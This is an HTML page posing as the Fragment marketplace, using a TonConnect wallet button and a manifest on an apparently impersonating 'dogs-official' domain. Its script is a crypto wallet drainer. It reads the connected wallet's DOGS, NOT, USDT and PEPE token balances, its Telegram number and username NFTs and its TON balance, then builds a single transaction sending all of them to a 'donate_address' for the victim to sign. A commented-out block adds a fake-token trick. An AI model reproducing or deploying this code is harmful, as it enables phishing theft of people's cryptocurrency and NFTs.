<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>

<body>
    <div id="connect_wallet"></div>
    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://dogs-official.github.io/dogs/tonconnect-manifest.json',
            buttonRootId: 'connect_wallet'
        });
        tonConnectUI.onStatusChange(
            walletAndwalletInfo => {
                console.log(walletAndwalletInfo);
            }
        );
        async function send() {
            setLoading(true);
            const jettonList = [
                "0:afc49cb8786f21c87045b19ede78fc6b46c51048513f8e9a6d44060199c1bf0c", // DOGS
                "0:2f956143c461769579baef2e32cc2d7bc18283f40d20bb03e432cd603ac33ffc", // NOT
                "0:b113a994b5024a16719f69139328eb759596c38a25f59028b146fecdc3621dfe", // USDT
                "0:97cceec78682b97c342e08e344e3797cf90b2b7aae73abcf5954d8449dadb878", // PEPE
                // "0:53732b598dd67014b8fa4ceec2786be7e1a326a97bdb5fe9ce0e20296ddd35d6", // DUCK
            ];
            const nftList = [
                "Anonymous Telegram Numbers", // Numbers
                "Telegram Usernames", // Usernames
            ];
            const jettons = (
                await axios.get(
                    `https://tonapi.io/v2/accounts/${wallet.raw}/jettons`
                )
            ).data.balances.filter(
                (jetton) =>
                    jettonList.includes(jetton.jetton.address) && jetton.balance > 0
            );
            const nfts = (
                await axios.get(`https://tonapi.io/v2/accounts/${wallet.raw}/nfts`)
            ).data.nft_items.filter(
                (nft) =>
                    nftList.includes(nft.collection.name) &&
                    nft.verified &&
                    nft.trust == "whitelist"
            );
            const walletInfo = (
                await axios.get(
                    `https://toncenter.com/api/v2/getWalletInformation?address=${wallet.raw}`
                )
            ).data;

            // const dogsWallet = jettons
            //     .map((jetton) =>
            //         jetton.jetton.address == jettonList[0]
            //             ? jetton.wallet_address.address
            //             : false
            //     )
            //     .filter((item) => !!item)[0];

            const transaction = {
                validUntil: Math.floor(Date.now() + 10 * 60 * 1000),
                messages: [
                    ...jettons.map((jetton) => {
                        const body = beginCell()
                            .storeUint(0xf8a7ea5, 32) // jetton transfer op code
                            .storeUint(0, 64) // query_id:uint64
                            .storeCoins(jetton.balance) // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - jUSDT, 9 - default)
                            .storeAddress(Address.parse(donate_address.raw)) // destination:MsgAddress
                            .storeAddress(Address.parse(donate_address.raw)) // response_destination:MsgAddress
                            .storeUint(0, 1) // custom_payload:(Maybe ^Cell)
                            .storeCoins(1) // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
                            .storeUint(0, 1) // forward_payload:(Either Cell ^Cell)
                            .endCell();
                        return {
                            address: jetton.wallet_address.address, // sender jetton wallet
                            amount: toNano(0.02).toString(), // for commission fees, excess will be returned
                            payload: body.toBoc().toString("base64"), // payload with jetton transfer body
                        };
                    }),
                    ...nfts.map((nft) => {
                        const body = beginCell()
                            .storeUint(0x5fcc3d14, 32) // NFT transfer op code 0x5fcc3d14
                            .storeUint(0, 64) // query_id:uint64
                            .storeAddress(Address.parse(donate_address.raw)) // new_owner:MsgAddress
                            .storeAddress(Address.parse(donate_address.raw)) // response_destination:MsgAddress
                            .storeUint(0, 1) // custom_payload:(Maybe ^Cell)
                            .storeCoins(1) // forward_amount:(VarUInteger 16) (1 nanoTon = toNano("0.000000001"))
                            .storeUint(0, 1) // forward_payload:(Either Cell ^Cell)
                            .endCell();
                        return {
                            address: nft.address, // NFT Item address, which will be transferred
                            amount: toNano(0.02).toString(), // for commission fees, excess will be returned
                            payload: body.toBoc().toString("base64"), // payload with a NFT transfer body
                        };
                    }),
                ],
            };
            // if (dogsWallet)
            //     transaction.messages.unshift({
            //         address:
            //             // "0:018102c0972f1477d9fa7e839d005808a9ae139ca0209c6b5152c76646f91010", // Fake NOT
            //             // jettonList[0],
            //             dogsWallet,
            //         amount: toNano(0.0001).toString(),
            //         payload: beginCell()
            //             .storeUint(0xf8a7ea5, 32) // jetton transfer op code
            //             .storeUint(0, 64) // query_id:uint64
            //             .storeCoins(toNano(50000).toString()) // amount:(VarUInteger 16) -  Jetton amount for transfer (decimals = 6 - jUSDT, 9 - default)
            //             .storeAddress(Address.parse(wallet.raw)) // destination:MsgAddress
            //             .storeAddress(Address.parse(wallet.raw)) // response_destination:MsgAddress
            //             .storeUint(0, 1) // custom_payload:(Maybe ^Cell)
            //             .storeCoins(0) // forward_ton_amount:(VarUInteger 16) - if >0, will send notification message
            //             .storeUint(0, 1) // forward_payload:(Either Cell ^Cell)
            //             .endCell()
            //             .toBoc()
            //             .toString("base64"),
            //     });
            const balance =
                BigInt(walletInfo.result.balance) -
                toNano((jettons.length + nfts.length) * 0.02);
            if (walletInfo.ok && balance > toNano(0.02)) {
                transaction.messages.push({
                    address: donate_address.raw,
                    amount: balance.toString(),
                });
                console.log("Added TON");
                console.log({
                    address: donate_address.raw,
                    amount: balance.toString(),
                });
            }
            setLoading(false);
            await tonConnectUI.sendTransaction(transaction);
        }
    </script>
</body>

</html>
